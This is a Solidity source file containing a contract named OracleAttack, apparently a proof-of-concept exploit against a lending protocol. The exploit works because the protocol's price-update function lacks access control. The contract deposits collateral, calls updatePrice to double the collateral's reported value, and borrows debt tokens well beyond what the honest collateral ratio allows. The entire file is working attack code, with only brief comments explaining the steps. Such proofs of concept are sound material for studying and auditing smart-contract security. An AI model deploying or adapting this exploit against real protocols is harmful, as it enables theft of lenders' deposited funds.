
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILending {
    function updatePrice(uint256 newRateA, uint256 newRateB) external;
    function depositCollateral(address token, uint256 amount) external;
    function borrow(address debtToken, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Oracle manipulation against a lending protocol that reads a
///         single writable price. Deposit collateral, inflate the price
///         (no access control), borrow far more than legitimately possible.
contract OracleAttack {
    ILending public lending;
    address public collateralToken;
    address public debtToken;

    constructor(address _lending, address _collateral, address _debt) {
        lending = ILending(_lending);
        collateralToken = _collateral;
        debtToken = _debt;
    }

    function attack() external {
        IERC20(collateralToken).approve(address(lending), type(uint256).max);
        lending.depositCollateral(collateralToken, 100 ether);
        // anyone can move the price -> 2x collateral value
        lending.updatePrice(2 ether, 1 ether);
        // borrow 100 debt — impossible at the honest 150% ratio
        lending.borrow(debtToken, 100 ether);
    }
}
